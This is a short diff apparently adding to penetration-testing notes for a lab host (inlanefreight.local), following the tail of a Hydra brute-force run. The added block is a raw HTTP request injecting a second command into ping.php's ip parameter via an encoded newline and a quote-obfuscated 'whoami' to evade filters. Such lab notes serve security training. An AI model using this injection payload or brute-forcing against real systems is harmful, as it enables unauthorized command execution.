@@ -661,3 +661,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
                                                                                  
 ```
+
+```
+GET /ping.php?ip=127.0.0.1%0awh'oa'mi HTTP/1.1
+Host: monitoring.inlanefreight.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Connection: keep-alive
+Referer: http://monitoring.inlanefreight.local/
+Cookie: PHPSESSID=8o50it6oau2g3v7i009a0hibvo
+Priority: u=0
+
+```
